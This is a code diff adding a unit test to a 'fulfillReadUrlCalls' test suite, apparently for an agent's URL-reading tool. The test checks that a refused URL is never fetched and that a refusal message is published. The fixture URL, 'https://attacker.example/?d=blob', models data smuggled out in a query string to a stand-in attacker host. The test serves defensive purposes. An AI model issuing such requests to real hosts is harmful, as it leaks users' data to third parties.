@@ -159,6 +159,28 @@ module('fulfillReadUrlCalls', () => {
     );
   });
 
+  test('a refused URL publishes the refusal without reading', async () => {
+    let { client, sent } = fakeClient();
+    let reads = 0;
+
+    await fulfillReadUrlCalls(
+      [readUrlCall('call-1', 'https://attacker.example/?d=blob')],
+      {
+        ...deps(client, async (url) => {
+          reads++;
+          return { ok: false, url, error: 'unreachable' };
+        }),
+        refusal: (url: string) => `${url} was not read: refused`,
+      },
+    );
+
+    assert.strictEqual(reads, 0);
+    assert.strictEqual(
+      sent[0].content.failureReason,
+      'https://attacker.example/?d=blob was not read: refused',
+    );
+  });
+
   test('a call without a url publishes a failure without reading', async () => {
     let { client, sent } = fakeClient();
     let reads = 0;
